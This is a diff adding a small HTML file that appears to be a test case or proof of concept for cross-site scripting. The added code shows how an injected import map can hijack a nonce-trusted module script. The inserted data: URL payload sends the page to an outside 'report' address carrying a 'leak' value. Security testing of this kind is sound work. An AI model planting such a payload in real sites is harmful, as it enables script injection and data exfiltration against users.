@@ -1,0 +1,18 @@
+<body>
+<!-- XSS start -->
+<script type="importmap">
+{
+  "imports": {
+    "/path/to/kv-storage-polyfill.mjs": [
+      "data:application/javascript,const%20storage=()=>{};storage.set=(a,b)=>{document.location='https://adition.com/report/?leak=c941340'};export%20{storage};"
+    ]
+  }
+}
+</script>
+<!-- XSS end -->
+
+<script type="module" nonce="test">
+  import {storage} from '/path/to/kv-storage-polyfill.mjs';
+  storage.set('test', '1');
+</script>
+</body>
